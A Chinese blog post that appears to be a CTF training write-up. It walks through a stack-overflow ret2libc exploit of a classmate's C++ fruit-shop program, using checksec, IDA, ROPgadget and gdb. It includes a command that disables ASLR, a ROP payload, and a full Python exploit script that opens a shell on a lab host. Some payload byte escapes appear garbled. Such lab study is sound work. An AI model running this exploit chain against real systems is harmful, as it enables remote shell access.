> 原文链接: https://www.anquanke.com//post/id/170660 


# Pwn FruitShop的故事（上）


                                阅读量   
                                **160942**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01d1aeef77c6b4014d.jpg)](https://p2.ssl.qhimg.com/t01d1aeef77c6b4014d.jpg)



## 0x00 背景

最近参加了某个非常有意思的CTF线下培训活动，讲师先让大家根据要求用C++完成一个卖水果功能的linux程序，然后让大家互相挖掘程序里的漏洞并实现利用。

卖水果程序的功能要求如下：
- 运行环境：Ubuntu 16.04 x64，gcc/g++编译后是64位程序
<li>程序运行后列出如下选项：<br>
0 管理员登录； //需要验证管理员的口令，管理员可以修改某种水果的库存量，不使用数据库<br>
1 列出全部水果种类；//默认具有三种水果<br>
2 选购某种水果；//进入后列出水果种类，选中某种水果后其库存量减少，库存量不足时不能购买<br>
3 放弃选购某种水果；//进入后列出当前选购的水果列表，放弃选购某种水果后其库存量恢复<br>
4 列出当前选购的水果及其购买数量；<br>
5 支付，显示待支付金额，之后退出运行；</li>
<li>编码要求：<br>
（1）管理员的登录验证过程使用用户名和序列号的方式，要求序列号与用户名具有对应关系，输入错误可继续输入，连续三次输入错误则退出运行。同时包含一个“后门”管理员 admin，其口令是某个固定字符串；<br>
（2）设计一个“水果”类作为父类，属性包括名称（不超过 16 字符）、价格（元）、库存数量（斤）、水果店描述等，前三个属性定义为 public 成员变量，第四个属性定义为 private 成员变量；<br>
（3）读写水果名称和价格的成员函数定义为虚函数，在父类中定义，在其子类中继承并实现；<br>
（4）某种水果，如苹果、梨子等，继承自“水果”类，属性包括名称（不超过 16 字符）、价格（元）、库存数量（斤）、水果描述（产地、营养成分等）等，前三个属性继承自父类，第四个属性定义为 private 成员变量，并定义或实现对应的成员函数实现属性的读写，其他属性自选；<br>
（5）已选购的水果使用链表方式存储在内存中；<br>
（6）使用 console 模式，即在终端字符界面中完成用户输入输出的交互。</li>
[![](https://p0.ssl.qhimg.com/t0122e98464341cc0c9.png)](https://p0.ssl.qhimg.com/t0122e98464341cc0c9.png)

由于在程序开发中每个人的思路都不一样，也不会刻意去制造漏洞，并且不少程序都开启了各种保护措施，使得挑战的难度增大不少。<br>
作为一名刚入门的技术小白，正好借此机会边玩边学习实践下Linux的漏洞利用技术。通过对30余个样本进行初步的逆向分析，我们筛选出了几个怀疑可以进行漏洞利用的样本进行了进一步的分析和调试。本次先给大家分享其中一个比较经典的x64位栈溢出漏洞。之后还会分享另外一个内存任意写的漏洞。

为便于大家复现，提供样本ELF程序和样本源码，可以在x64的linux虚拟机上运行。

对应样本的源代码：f1_x64_stack.cpp<br>
链接：[https://pan.baidu.com/s/1tHXDCuKpf7jjd666k0y7VA](https://pan.baidu.com/s/1tHXDCuKpf7jjd666k0y7VA)<br>
提取码：yg52

分析的样本程序：f1_x64_stack<br>
链接：[https://pan.baidu.com/s/1yFA–uXSCT_jBdNhg6-9sg](https://pan.baidu.com/s/1yFA--uXSCT_jBdNhg6-9sg)<br>
提取码：x7ag



## 0x01 样本筛选

首先利用Checksec工具对每一个ELF程序开启的保护机制进行分析，在第一轮的筛选中，我们重点关注的是栈有关的漏洞。通过Checksec工具，发现其中一个样本没有开启Canary保护机制，将该样本命名为f1，作深入分析。

[![](https://p5.ssl.qhimg.com/t014e8f0fd57545827e.png)](https://p5.ssl.qhimg.com/t014e8f0fd57545827e.png)
- RELRO：RELRO会有Partial RELRO和FULL RELRO两种，如果开启FULL RELRO，意味着我们无法修改got表。而Partial RELRO意味着对got表有写的权限，可以通过对相应libc函数的got表进行改写完成漏洞利用。
- Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址
- NX：NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop和ret2libc进行绕过
- PIE：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址
可见，该64位样本没有开启Canary机制，一旦有栈溢出漏洞，就可以控制函数的返回地址，但其开启了NX保护，导致无法借用jmp esp跳入shellcode，而需要采用其它方式绕过。



## 0x02 漏洞定位

将结合漏洞定位和利用进行动态调试和分析。在Ubuntu 16.04 x64虚拟机终端上运行：<br>
socat tcp-l:8888,reuseaddr,fork exec:”stdbuf -i0 -o0 -e0 ./f1_x64_stack” 用ps -e查看fshop_b3进程的pid，再用gdb attach 上对应pid的进程结合断点进行调试。

用IDA对该64位ELF进行分析，并对其局部变量进行标注。我们最先想到的就是其管理员admin登陆时输入的用户名和密码有无检查输入字符的长度。由于这名参训者把功能都写在主函数里，其main的结构显得相对复杂。

[![](https://p3.ssl.qhimg.com/t0156a750d863f0fa94.png)](https://p3.ssl.qhimg.com/t0156a750d863f0fa94.png)

可见其main()函数在栈中开辟的局部变量情况和并可以计算变量大小。

[![](https://p2.ssl.qhimg.com/t01d135976e76817052.png)](https://p2.ssl.qhimg.com/t01d135976e76817052.png)

我们可以看到进行usr name和Password的输入的地方，输入数据在栈上，并没有对其输入长度进行合法性检查，可以判定此处存在栈溢出漏洞。

[![](https://p0.ssl.qhimg.com/t014778caab6cac1390.png)](https://p0.ssl.qhimg.com/t014778caab6cac1390.png)

在main()函数中寻找函数返回，可以通过usr name的输入对栈进行溢出，覆盖ret返回地址，实现对rip的控制。



## 0x03 漏洞利用

关闭Ubuntu 16.04 x64的ASLR机制。以root权限执行下面命令，关闭系统ASLR机制：<br>`echo 0 &gt; /proc/sys/kernel/randomize_va_space`

由于该样本开启了NX保护，无法在栈上执行指令，因此无法通过jmp rsp的方式实现漏洞利用。那么我们可以试着采用ret2libc的方式来绕过NX保护。

#### <a class="reference-link" name="&lt;1&gt;%20%E5%AE%9A%E4%BD%8Dsystem%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"></a>&lt;1&gt; 定位system函数地址

我们的目标是实现执行system(‘/bin/sh’)，来返回一个shell。由于关闭了系统的ASLR机制，我们可以先来看看libc中system()的地址。

第一种：计算偏移量<br>`ldd f1`<br>`objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep system`

[![](https://p0.ssl.qhimg.com/t01094d1cb33d10bd01.png)](https://p0.ssl.qhimg.com/t01094d1cb33d10bd01.png)<br>[![](https://p1.ssl.qhimg.com/t01f8e6a646d9689e35.png)](https://p1.ssl.qhimg.com/t01f8e6a646d9689e35.png)

Addr_libc_system = Addr_libc.so.6 + offset = 0x7ffff716c00 + 0x45390 = 0x7ffff71b1390

第二种：直接用gdb打印出地址<br>`print system`<br>[![](https://p0.ssl.qhimg.com/t01f1ba1c1c59e9b72e.png)](https://p0.ssl.qhimg.com/t01f1ba1c1c59e9b72e.png)

此时system地址为0x7ffff71b1390

关闭ASLR后，利用gdb attach上对应进程后，system的地址如图：

[![](https://p2.ssl.qhimg.com/t017d412f1eece08808.png)](https://p2.ssl.qhimg.com/t017d412f1eece08808.png)

此时lib.so.6基址：0x7ffff6faf390 – 0x45390 = 0x7ffff6f6a000

#### &lt;2&gt; 定位`/bin/sh`地址

`objdump -s /lib/x86_64-linux-gnu/libc.so.6 |grep '/bin/sh'`

[![](https://p0.ssl.qhimg.com/t01fe2aa6f7db7e0345.png)](https://p0.ssl.qhimg.com/t01fe2aa6f7db7e0345.png)<br>[![](https://p1.ssl.qhimg.com/t019785a5b290eb5842.png)](https://p1.ssl.qhimg.com/t019785a5b290eb5842.png)

注：libc.so.6是libc-2.23.so的软连接<br>
Addr_libc_binsh = 0x7ffff6f6a000 + 0x18cd57 = 7ffff70f6d57<br>[![](https://p3.ssl.qhimg.com/t010ade0dc05ca0c334.png)](https://p3.ssl.qhimg.com/t010ade0dc05ca0c334.png)

#### <a class="reference-link" name="&lt;3&gt;%20%E6%9E%84%E9%80%A0ROP"></a>&lt;3&gt; 构造ROP

x86-32位架构下的函数调用一般通过栈来传递参数，而x86-64位架构下的函数调用的一般用rdi,rsi,rdx,rcx,r8和r9寄存器依次保存前6个整数型参数，浮点型参数保存在寄存器xmm0,xmm1…中，有更多的参数才通过栈来传递参数。下图是64位架构下的system函数调用过程。<br>[![](https://p1.ssl.qhimg.com/t01b7ed91d6e884e23b.png)](https://p1.ssl.qhimg.com/t01b7ed91d6e884e23b.png)

因为程序开启了NX保护，无法执行栈上的shellcode，但可以在该程序中寻找gadget来实现system函数传参调用的功能。由于需要rdi传参，所以需要寻找`pop rdi;ret`

`ROPgadget --binary f1 --only 'pop|ret'`<br>[![](https://p1.ssl.qhimg.com/t01ff1257a71359da61.png)](https://p1.ssl.qhimg.com/t01ff1257a71359da61.png)

#### <a class="reference-link" name="&lt;4&gt;%20%E6%9E%84%E9%80%A0payload"></a>&lt;4&gt; 构造payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0154f335be05eaede8.png)

使用usr_name来进行栈溢出，0xA0 = 160<br>
构造的payload如下

```
######################
#      'A'*160       #          //padding
######################
#      'A'*8         #          //old rbp
######################
# 0x0000000000401bd3 #  ret     //gadget
######################
# 0x00007ffff70f6d57 #  pop rdi //Addr '/bin/sh'
######################
# 0x00007ffff6faf390 #  ret     //Addr system
######################

bHex1 = b'x41'*168 + 
        b'xd3x1Bx40x00x00x00x00x00' 
        b'x57x6dx0fxf7xffx7fx00x00' 
        b'x90xf3xfaxf6xffx7fx00x00' 
        b'x0Dx0A'
```

#### <a class="reference-link" name="&lt;5&gt;%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E"></a>&lt;5&gt;触发漏洞

先选择0，登录管理员，出现输入usr name后，将我们的payload传入<br>[![](https://p5.ssl.qhimg.com/t019dbfdb2035e31803.png)](https://p5.ssl.qhimg.com/t019dbfdb2035e31803.png)<br>
之后需要main函数返回才能触发漏洞，所以再输入5，返回触发漏洞。<br>[![](https://p3.ssl.qhimg.com/t01302c65e41ac94c85.png)](https://p3.ssl.qhimg.com/t01302c65e41ac94c85.png)

```
sendData('0n')         # login as admin
sendBin(bHex1)          # usr name
sendData('123n')       # Password
sendData('5n')         # pay&amp;exit

while(1):
    command = input('shell&gt;')
    sendData(command + 'n')
```

gdb动态调试过程：<br>
Attach上创建的fshop_b3的进程，下2个断点。0x400DDA是在输入usr_name前的断点，0x401813是main函数返回前的断点。<br>[![](https://p1.ssl.qhimg.com/t01fedda989cf59032b.png)](https://p1.ssl.qhimg.com/t01fedda989cf59032b.png)

在输入usr_name前栈的情况：<br>[![](https://p2.ssl.qhimg.com/t017d84bfa0d77084d6.png)](https://p2.ssl.qhimg.com/t017d84bfa0d77084d6.png)

在输入usr_name后栈被payload覆盖的情况：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01fa5d1c3c39d2fcd7.png)

在0x401813断点，main函数返回前：<br>[![](https://p2.ssl.qhimg.com/t0169016ef810f17a3c.png)](https://p2.ssl.qhimg.com/t0169016ef810f17a3c.png)<br>
通过ROP控制rdi寄存器并跳入system：<br>[![](https://p5.ssl.qhimg.com/t0161fb76f001943346.png)](https://p5.ssl.qhimg.com/t0161fb76f001943346.png)

漏洞利用动图：<br>[![](https://p3.ssl.qhimg.com/t012b6a7ffd8bfee121.gif)](https://p3.ssl.qhimg.com/t012b6a7ffd8bfee121.gif)

完整利用代码：Python3

```
import socket
import time

client = socket.socket()
client.connect(('10.0.27.142', 8888))

def sendData(strData):
    bHex = bytes(strData, encoding='ascii')
    client.sendall(bHex)
    time.sleep(0.2)
    data = client.recv(4096)
    try:
        print(str(data, "ascii"))
    except:
        print(data)

def sendBin(bHex):
    client.sendall(bHex)
    time.sleep(0.2)
    data = client.recv(1024)
    try:
        print(str(data, "ascii"))
    except:
        print(data)

sendData('0n')         # login as admin

bHex1 = b'x41' * 168 + 
        b'xd3x1Bx40x00x00x00x00x00' 
        b'x57x6dx0fxf7xffx7fx00x00' 
        b'x90xf3xfaxf6xffx7fx00x00' 
        b'x0Dx0A'

sendBin(bHex1)          # usr name
sendData('123n')       # Password
sendData('5n')         # pay&amp;exit

while(1):
    command = input('shell&gt;')
    sendData(command + 'n')
```

本次分享的x64栈溢出漏洞相对比较容易上手，尤其在关闭了ASLR后。下次将分享另外一个样本，其漏洞成因和利用方式更为复杂，并且要在ASLR开启的环境下进行漏洞利用。请大家继续关注~
